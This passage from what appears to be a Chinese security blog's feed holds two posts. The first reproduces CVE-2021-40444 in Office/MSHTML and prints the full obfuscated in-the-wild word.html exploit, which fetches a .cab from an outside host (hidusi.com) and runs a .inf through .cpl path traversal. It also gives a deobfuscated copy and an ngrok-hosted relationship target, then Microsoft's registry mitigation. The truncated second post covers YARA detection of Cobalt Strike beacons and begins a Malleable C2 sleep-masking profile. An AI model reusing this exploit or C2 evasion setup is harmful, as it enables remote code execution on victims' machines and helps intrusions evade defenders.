Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject&quot; Target=&quot;mhtml:http://3079-183-6-55-142.ngrok.io/word.html!x-usc:http://3079-183-6-55-142.ngrok.io/word.html&quot; TargetMode=&quot;External&quot;/&gt;&lt;Relationship Id=&quot;rId5&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot; Target=&quot;media/image2.wmf&quot;/&gt;&lt;Relationship Id=&quot;rId4&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot; Target=&quot;media/image1.jpeg&quot;/&gt;&lt;/Relationships&gt;</code></pre><p>或者直接用已经公开的exp生成：<a href="https://github.com/lockedbyte/CVE-2021-40444" target="_blank" rel="noopener">https://github.com/lockedbyte/CVE-2021-40444</a><br>效果如下<br><img src="https://z3.ax1x.com/2021/09/13/4PcL7V.jpg" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PgS1J.jpg" alt=""></p><p>触发漏洞主要是word.html里的js和原版混淆的一样，只是改了远程请求链接</p><pre><code class="javascrript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&quot;Expires&quot; content=&quot;-1&quot;&gt;        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=11&quot;&gt;    &lt;/head&gt;    &lt;body&gt;&lt;!-- 这段js利用[]进行函数执行     --&gt;&lt;!-- 重复的垃圾代码 --&gt;        &lt;script&gt;            var a0_0x127f = [&#39;123&#39;, &#39;365952KMsRQT&#39;, &#39;tiveX&#39;, &#39;/Lo&#39;, &#39;./../../&#39;, &#39;contentDocument&#39;, &#39;ppD&#39;, &#39;Dat&#39;, &#39;close&#39;, &#39;Acti&#39;, &#39;removeChild&#39;, &#39;mlF&#39;, &#39;write&#39;, &#39;./A&#39;, &#39;ata/&#39;, &#39;ile&#39;, &#39;../&#39;, &#39;body&#39;, &#39;setAttribute&#39;, &#39;#version=5,0,0,0&#39;, &#39;ssi&#39;, &#39;iframe&#39;, &#39;748708rfmUTk&#39;, &#39;documentElement&#39;, &#39;lFile&#39;, &#39;location&#39;, &#39;159708hBVRtu&#39;, &#39;a/Lo&#39;, &#39;Script&#39;, &#39;document&#39;, &#39;call&#39;, &#39;contentWindow&#39;, &#39;emp&#39;, &#39;Document&#39;, &#39;Obj&#39;, &#39;prototype&#39;, &#39;lfi&#39;, &#39;bject&#39;, &#39;send&#39;, &#39;appendChild&#39;, &#39;Low/championship.inf&#39;, &#39;htmlfile&#39;, &#39;115924pLbIpw&#39;, &#39;GET&#39;, &#39;p/championship.inf&#39;, &#39;1109sMoXXX&#39;, &#39;./../A&#39;, &#39;htm&#39;, &#39;l/T&#39;, &#39;cal/&#39;, &#39;1wzQpCO&#39;, &#39;ect&#39;, &#39;w/championship.inf&#39;, &#39;522415dmiRUA&#39;, &#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab&#39;, &#39;88320wWglcB&#39;, &#39;XMLHttpRequest&#39;, &#39;championship.inf&#39;, &#39;Act&#39;, &#39;D:edbc374c-5730-432a-b5b8-de94f0b57217&#39;, &#39;open&#39;, &#39;&lt;bo&#39;, &#39;HTMLElement&#39;, &#39;/..&#39;, &#39;veXO&#39;, &#39;102FePAWC&#39;];            function a0_0x15ec(_0x329dba, _0x46107c) {                return a0_0x15ec = function(_0x127f75, _0x15ecd5) {                    _0x127f75 = _0x127f75 - 0xaa;                    var _0x5a770c = a0_0x127f[_0x127f75];                    return _0x5a770c;                }                ,                a0_0x15ec(_0x329dba, _0x46107c); //a0_0x15ec函数主要调用返回            }            (function(_0x59985d, _0x17bed8) { //_0x59985d -&gt; a0_0x127f                var _0x1eac90 = a0_0x15ec;                while (!![]) {                    try {                        var _0x2f7e2d = parseInt(_0x1eac90(0xce)) + parseInt(_0x1eac90(0xd8)) * parseInt(_0x1eac90(0xc4)) + parseInt(_0x1eac90(0xc9)) * -parseInt(_0x1eac90(0xad)) + parseInt(_0x1eac90(0xb1)) + parseInt(_0x1eac90(0xcc)) + -parseInt(_0x1eac90(0xc1)) + parseInt(_0x1eac90(0xda));                        if (_0x2f7e2d === _0x17bed8) //判断两者数值是否等于384881，如果相等则break                            break;                        else                            _0x59985d[&#39;push&#39;](_0x59985d[&#39;shift&#39;]()); //将a0_0x127f数组首位元素移动到数组尾部                    } catch (_0x34af1e) {                        _0x59985d[&#39;push&#39;](_0x59985d[&#39;shift&#39;]());                    }                }            }(a0_0x127f, 0x5df71), //数组元素移动到尾部的算法            function() {                var _0x2ee207 = a0_0x15ec                  , _0x279eab = window                  , _0x1b93d7 = _0x279eab[_0x2ee207(0xb4)] //调用的a0_0x15ec函数 -&gt; window.document                  , _0xcf5a2 = _0x279eab[_0x2ee207(0xb8)][&#39;prototype&#39;][&#39;createElement&#39;] // -&gt; Document.prototype.createElement                  , _0x4d7c02 = _0x279eab[_0x2ee207(0xb8)][&#39;prototype&#39;][_0x2ee207(0xe5)] // -&gt; Document.prototype.write                  , _0x1ee31c = _0x279eab[_0x2ee207(0xd5)][_0x2ee207(0xba)][_0x2ee207(0xbe)] // -&gt; HTMLElement.prototype.appendChild                  , _0x2d20cd = _0x279eab[_0x2ee207(0xd5)][_0x2ee207(0xba)][_0x2ee207(0xe3)] // -&gt; HTMLElement.prototype.removeChild                  , _0x4ff114 = _0xcf5a2[&#39;call&#39;](_0x1b93d7, _0x2ee207(0xac)); // -&gt; Document.prototype.createElement.call(window.document,&quot;iframe&quot;) -&gt; &lt;new iframe&gt;                try {                    _0x1ee31c[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xea)], _0x4ff114); // -&gt; HTMLElement.prototype.appendChild.call(window.document.body,&lt;new iframe&gt;) //添加iframe标签                } catch (_0x1ab454) {                    _0x1ee31c[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xae)], _0x4ff114);                }                var _0x403e5f = _0x4ff114[_0x2ee207(0xb6)][&#39;ActiveXObject&#39;] // -&gt; &lt;new iframe&gt;.contentWindow.ActiveXObject                  , _0x224f7d = new _0x403e5f(_0x2ee207(0xc6) + _0x2ee207(0xbb) + &#39;le&#39;); // -&gt; new _0x403e5f(&#39;htmlfile&#39;) -&gt; new ActiveXObject(&#39;htmlfijle&#39;)                _0x4ff114[_0x2ee207(0xde)][&#39;open&#39;]()[_0x2ee207(0xe1)](); // -&gt; &lt;new iframe&gt;.contentDocument.open().close()                var _0x371a71 = &#39;p&#39;;                try {                    _0x2d20cd[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xea)], _0x4ff114); // -&gt; HTMLElement.prototype.removeChild.call(window.document.body,&lt;new iframe&gt;)                } catch (_0x3b004e) {                    _0x2d20cd[&#39;call&#39;](_0x1b93d7[&#39;documentElement&#39;], _0x4ff114);                }                function _0x2511dc() {                    var _0x45ae57 = _0x2ee207;                    return _0x45ae57(0xcd);                }                _0x224f7d[&#39;open&#39;]()[_0x2ee207(0xe1)](); // -&gt; _0x224f7d.open().close()  -&gt; new ActiveXObject(&#39;htmlfijle&#39;).open().close()                var _0x3e172f = new _0x224f7d[(_0x2ee207(0xb3))][(_0x2ee207(0xd1)) + &#39;iveX&#39; + (_0x2ee207(0xb9)) + (_0x2ee207(0xca))](&#39;htm&#39; + _0x2ee207(0xaf)); // -&gt; new _0x224f7d.Script.ActiveXObject(&#39;htmlFile&#39;) -&gt; new ActiveXObject(&#39;htmlfijle&#39;).Script.ActiveXObject(&#39;htmlFile&#39;)                _0x3e172f[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; _0x3e172f.open().close()                var _0xd7e33d = &#39;c&#39;                  , _0x35b0d4 = new _0x3e172f[(_0x2ee207(0xb3))][&#39;Ac&#39; + (_0x2ee207(0xdb)) + &#39;Ob&#39; + &#39;ject&#39;](&#39;ht&#39; + _0x2ee207(0xe4) + _0x2ee207(0xe8)); // -&gt; new _0x3e172f.Script.ActiveXObject(&#39;htmlFile&#39;)                _0x35b0d4[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; _0x35b0d4.open().close()                var _0xf70c6e = new _0x35b0d4[&#39;Script&#39;][(_0x2ee207(0xe2)) + (_0x2ee207(0xd7)) + (_0x2ee207(0xbc))](&#39;ht&#39; + &#39;mlF&#39; + _0x2ee207(0xe8));                _0xf70c6e[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; new _0x35b0d4.Script.ActiveXObject(&#39;htmlFile&#39;)                var _0xfed1ef = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x5f3191 = new ActiveXObject(_0x2ee207(0xc0)) // new ActiveXObject(&#39;htmlFile&#39;)                  , _0xafc795 = new ActiveXObject(_0x2ee207(0xc0))                  , _0x5a6d4b = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x258443 = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x53c2ab = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x3a627b = _0x279eab[_0x2ee207(0xcf)] //window.XMLHttpRequest                  , _0x2c84a8 = new _0x3a627b() // new window.XMLHttpRequest()                  , _0x220eee = _0x3a627b[_0x2ee207(0xba)][_0x2ee207(0xd3)] //&lt;XMLHttpRequest&gt;.prototype.open                  , _0x3637d8 = _0x3a627b[_0x2ee207(0xba)][_0x2ee207(0xbd)] //&lt;XMLHttpRequest&gt;.prototype.send                  , _0x27de6f = _0x279eab[&#39;setTimeout&#39;]; //window.XMLHttpRequest.setTimeout                _0x220eee[_0x2ee207(0xb5)](_0x2c84a8, _0x2ee207(0xc2), _0x2511dc(), ![]), //&lt;XMLHttpRequest&gt;.prototype.open.call(&lt;XMLHttpRequest&gt;,&#39;GET&#39;,&#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab&#39;,![])                _0x3637d8[_0x2ee207(0xb5)](_0x2c84a8),//&lt;XMLHttpRequest&gt;.prototype.send.call(&lt;XMLHttpRequest&gt;,)                _0xf70c6e[_0x2ee207(0xb3)][_0x2ee207(0xb4)][_0x2ee207(0xe5)](_0x2ee207(0xd4) + &#39;dy&gt;&#39;); //_0xf70c6e.Script.document.write(&#39;&lt;body&gt;&#39;)                var _0x126e83 = _0xcf5a2[_0x2ee207(0xb5)](_0xf70c6e[&#39;Script&#39;][_0x2ee207(0xb4)], &#39;ob&#39; + &#39;je&#39; + &#39;ct&#39;); //Document.prototype.createElement.call(_0xf70c6e.Script.document,&#39;object&#39;)                _0x126e83[_0x2ee207(0xeb)](&#39;co&#39; + &#39;de&#39; + &#39;ba&#39; + &#39;se&#39;, _0x2511dc() + _0x2ee207(0xaa)); //_0x126e83.setAttribute(codebase,&#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab#version=5,0,0,0&#39;)                var _0x487bfa = &#39;l&#39;;                _0x126e83[_0x2ee207(0xeb)](&#39;c&#39; + &#39;la&#39; + _0x2ee207(0xab) + &#39;d&#39;, &#39;CL&#39; + &#39;SI&#39; + _0x2ee207(0xd2)), //_0x126e83.setAttribute(&#39;CLSID:edbc374c-5730-432a-b5b8-de94f0b57217&#39;)                _0x1ee31c[_0x2ee207(0xb5)](_0xf70c6e[_0x2ee207(0xb3)][&#39;document&#39;][&#39;body&#39;], _0x126e83), //HTMLElement.prototype.appendChild.call(_0xf70c6e.Script.document.body,_0x126e83)                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                &lt;!-- 重复垃圾代码分割线 --&gt;                //_0xfed1ef.Script.location=&#39;.cpl:123&#39;                _0xfed1ef[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[&#39;Script&#39;][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                &lt;!-- 重复垃圾代码分割线 --&gt;                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xc5) + _0x2ee207(0xdf) + _0x2ee207(0xe7) + &#39;Lo&#39; + _0x2ee207(0xc8) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + _0x2ee207(0xcb)                &lt;!-- 重复垃圾代码分割线2 --&gt;                //_0xfed1ef.Script.location==&#39;.cpl:../../../AppData/Local/Temp/Low/championship.inf&#39;,                _0x5f3191[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xe6) + &#39;pp&#39; + _0x2ee207(0xe0) + &#39;a/Lo&#39; + &#39;ca&#39; + _0x2ee207(0xc7) + &#39;em&#39; + &#39;p/championship.inf&#39;,                _0xafc795[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + _0x2ee207(0xd6) + &#39;/.&#39; + &#39;./../A&#39; + _0x2ee207(0xdf) + _0x2ee207(0xe7) + &#39;Lo&#39; + _0x2ee207(0xc8) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + &#39;w/championship.inf&#39;,                _0x5a6d4b[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + _0x2ee207(0xe9) + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xe6) + &#39;pp&#39; + &#39;Dat&#39; + _0x2ee207(0xb2) + &#39;ca&#39; + &#39;l/T&#39; + &#39;em&#39; + _0x2ee207(0xc3),                _0x258443[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + _0x2ee207(0xd6) + &#39;/.&#39; + _0x2ee207(0xdd) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + _0x2ee207(0xcb),                _0x5a6d4b[&#39;Script&#39;][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + &#39;../&#39; + &#39;..&#39; + &#39;/.&#39; + &#39;./../T&#39; + &#39;em&#39; + &#39;p/championship.inf&#39;,                _0x5a6d4b[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xe9) + _0x2ee207(0xe9) + _0x2ee207(0xbf),                _0x5a6d4b[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;../&#39; + _0x2ee207(0xe9) + _0x2ee207(0xd0);                &lt;!-- 重复垃圾代码分割线2 --&gt;            }());        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>公开POC里的deob.html为作者解密混淆后写的</p><pre><code class="javascrript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&quot;Expires&quot; content=&quot;-1&quot;&gt;        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=11&quot;&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            function garbage() {                return &#39;garbage&#39;;            }            (function exploit() {                var iframe = window[&quot;Document&quot;][&#39;prototype&#39;][&#39;createElement&#39;][&#39;call&#39;](window[&quot;document&quot;], &#39;iframe&#39;); //创建一个iframe标签的object                try {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;body&#39;], iframe); //当前body内容里添加iframe标签                } catch (_0x1ab454) {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;documentElement&#39;], iframe);                }                var htmlfile = iframe[&#39;contentWindow&#39;][&#39;ActiveXObject&#39;] //实例化ActiveXObject                  , htmlfile2 = new htmlfile(&#39;htmlfile&#39;); //htmlfile就是一个COM版的DOM，也就是说，htmlfile是个ActiveX版的 window.document                iframe[&#39;contentDocument&#39;][&#39;open&#39;]()[&#39;close&#39;](); //没有意义                try {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;removeChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;body&#39;], iframe); //删除iframe标签                } catch (_0x3b004e) {                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;removeChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;documentElement&#39;], iframe);                }                htmlfile2[&#39;open&#39;]()[&#39;close&#39;](); //没有意义                var htmlfile3 = new htmlfile2[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);                htmlfile3[&#39;open&#39;]()[&#39;close&#39;]();                var htmlfile4 = new htmlfile3[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);                htmlfile4[&#39;open&#39;]()[&#39;close&#39;]();                var htmlfile5 = new htmlfile4[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);                htmlfile5[&#39;open&#39;]()[&#39;close&#39;]();                var ActiveXObjectVAR = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR2 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR3 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR4 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR5 = new ActiveXObject(&#39;htmlfile&#39;)                  , ActiveXObjectVAR6 = new ActiveXObject(&#39;htmlfile&#39;)                  , XMLHttpR = new window[&#39;XMLHttpRequest&#39;]()                  , XMLHttpRopen = window[&#39;XMLHttpRequest&#39;][&#39;prototype&#39;][&#39;open&#39;]                  , XMLHttpRsend = window[&#39;XMLHttpRequest&#39;][&#39;prototype&#39;][&#39;send&#39;];                XMLHttpRopen[&#39;call&#39;](XMLHttpR, &#39;GET&#39;, &#39;http://127.0.0.1/test.cab&#39;, ![]), //构造请求远程端的test.cab链接                XMLHttpRsend[&#39;call&#39;](XMLHttpR), //发送请求                htmlfile5[&#39;Script&#39;][&#39;document&#39;][&#39;write&#39;](&#39;body&gt;&#39;);                var htmlScript = window[&quot;Document&quot;][&#39;prototype&#39;][&#39;createElement&#39;][&#39;call&#39;](htmlfile5[&#39;Script&#39;][&#39;document&#39;], &#39;object&#39;); //创建Scriptobject                //下面这两步将会让IE自动请求远程的cab然后自动解压                htmlScript[&#39;setAttribute&#39;](&#39;codebase&#39;, &#39;http://127.0.0.1/test.cab#version=5,0,0,0&#39;); //设定codebase属性值                htmlScript[&#39;setAttribute&#39;](&#39;CLSID:edbc374c-5730-432a-b5b8-de94f0b57217&#39;), //设置CLSID                window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](htmlfile5[&#39;Script&#39;][&#39;document&#39;][&#39;body&#39;], htmlScript), //将scriptobject添加到body                //逐个尝试用cpl从对应的路径中执行championship.inf文件（盲猜路径执行，总有一个能成）                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../AppData/Local/Temp/Low/championship.inf&#39;,                ActiveXObjectVAR2[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../AppData/Local/Temp/championship.inf&#39;,                ActiveXObjectVAR3[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../AppData/Local/Temp/Low/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../AppData/Local/Temp/championship.inf&#39;,                ActiveXObjectVAR5[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../../Temp/Low/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../../Temp/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../Low/championship.inf&#39;,                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../championship.inf&#39;; //设置cpl执行championship.inf            }());        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>调用XMLHttpRequest请求cab文件后 ,将自动解压到Temp目录，最后用cpl执行<br><img src="https://z3.ax1x.com/2021/09/13/4P2Ya6.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P2dRe.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P2wxH.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P26dP.png" alt=""></p><p>参考链接:<a href="https://www.cnblogs.com/qguohog/archive/2013/01/25/2876828.html" target="_blank" rel="noopener">https://www.cnblogs.com/qguohog/archive/2013/01/25/2876828.html</a></p><p>动态执行分析如下：<br>-&gt;远程请求发起<br>-&gt;mshtml.dll解析js里的内容<br>-&gt;然后下载cab文件<br>-&gt;从IE的TEMP目录找到临时的cab文件解压到C:\Users\<username>\AppData\Local\Temp<br>-&gt;最后control.exe将调用inf<br><img src="https://z3.ax1x.com/2021/09/13/4P2vQJ.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PR9dx.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PR1fS.png" alt=""></username></p><p>复现GIF<br><img src="https://z3.ax1x.com/2021/09/13/4PRGlQ.gif" alt=""></p><p>修复方案：<br>这会将 64 位和 32 位进程的所有 Internet 区域的 URLACTION_DOWNLOAD_SIGNED_ACTIVEX (0x1001) 和 URLACTION_DOWNLOAD_UNSIGNED_ACTIVEX (0x1004) 设置为 DISABLED (3)。不会安装新的 ActiveX 控件。以前安装的 ActiveX 控件将继续运行。</p><p>如何撤消解决方法<br>将策略中的选项设置为Enable。<br>要通过 regkey 在单个系统上禁用 ActiveX 控件：<br>警告如果注册表编辑器使用不当，可能会导致严重的问题，可能需要重新安装操作系统。Microsoft 不能保证您可以解决因注册表编辑器使用不当而导致的问题。使用注册表编辑器风险自负。</p><p>要禁止在 Internet Explorer 中的所有区域安装 ActiveX 控件，请将以下内容粘贴到文本文件中并使用 .reg 文件扩展名保存：</p><pre><code>Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3]&quot;1001&quot;=dword:00000003&quot;1004&quot;=dword:00000003</code></pre><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;测试环境&quot;&gt;&lt;a href=&quot;#测试环境&quot; class=&quot;headerlink&quot; title=&quot;测试环境&quot;&gt;&lt;/a&gt;测试环境&lt;/h2&gt;&lt;p&gt;office 2016&lt;br&gt;windows 10 ver:1909&lt;/p&gt;
&lt;h2 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>关于这几天cs进程里的特征和网上的一些bypass</title>
    <link href="http://422926799.github.io/posts/40a5ffce.html"/>
    <id>http://422926799.github.io/posts/40a5ffce.html</id>
    <published>2021-09-11T09:53:15.000Z</published>
    <updated>2021-09-11T10:08:32.260Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/" target="_blank" rel="noopener">https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/</a><br><a href="https://mp.weixin.qq.com/s/mh8iYU6lQohsVrINM2uvCg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/mh8iYU6lQohsVrINM2uvCg</a><br><a href="https://www.arashparsa.com/hook-heaps-and-live-free/" target="_blank" rel="noopener">https://www.arashparsa.com/hook-heaps-and-live-free/</a></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>首先cs上线进程注入个进程<br><img src="https://z3.ax1x.com/2021/09/11/hzyILF.png" alt=""></p><p>使用ProcessHacker定位到SleepEx函数<br><img src="https://z3.ax1x.com/2021/09/11/hzy7dJ.png" alt=""></p><p>转到内存保存可以看到明显的MZ头<br><img src="https://z3.ax1x.com/2021/09/11/hzyxsO.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/11/hz6Zy8.png" alt=""></p><p>利用给出的yara规则进行进程检测，可以很明显的发现是cs的进程<br><a href="https://github.com/jas502n/cs_yara" target="_blank" rel="noopener">https://github.com/jas502n/cs_yara</a><br>遍历进程寻找cs的进程：powershell -command “Get-Process | ForEach-Object {./yara64.exe beaconEye.yar $_.ID -s}”<br><img src="https://z3.ax1x.com/2021/09/11/hz6rSx.png" alt=""></p><pre><code>rule CobaltStrike {  strings:      $cobaltStrikeRule64 = {  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00 (00|01|02|04|08|10) 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00 ?? ?? 00 00 00 00 00 00  02 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00  02 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00  01 00 00 00 00 00 00 00 ?? ?? 00 00 00 00 00 00 }    $cobaltStrikeRule32 = {  00 00 00 00 00 00 00 00  01 00 00 00 (00|01|02|04|08|10) 00 00 00 01 00 00 00 ?? ?? 00 00  02 00 00 00 ?? ?? ?? ??  02 00 00 00 ?? ?? ?? ??  01 00 00 00 ?? ?? 00 00 }  condition: any of them}</code></pre><p>cs的c2profile的sleep_mask是sleep xor加密的算法是否开启<br><img src="https://z3.ax1x.com/2021/09/11/hz64fI.png" alt=""></p><p>sleep.profile</p><pre><code>#This profile is meant to show all of the options available in Malleable C2#Various options# Append random-length string (up to data_jitter value) to http-get and http-post server outputset sample_name &quot;Test Profile&quot;;set dns_idle &quot;0.0.0.0&quot;;set dns_max_txt &quot;252&quot;;set dns_sleep &quot;0&quot;;set dns_stager_prepend &quot;&quot;;set dns_stager_subhost &quot;.stage.123456.&quot;;set dns_ttl &quot;1&quot;;set host_stage &quot;true&quot;; #Host payload for staging over set, setS, or DNS. Required by stagers.set jitter &quot;0&quot;;set maxdns &quot;255&quot;;set pipename &quot;msagent_###&quot;; #Default name of pipe to use for SMB Beacon’s peer-to-peer communication. Each # is replaced witha random hex value.set pipename_stager &quot;status_##&quot;;set sleeptime &quot;60000&quot;; #def sleep in msset smb_frame_header &quot;&quot;;set 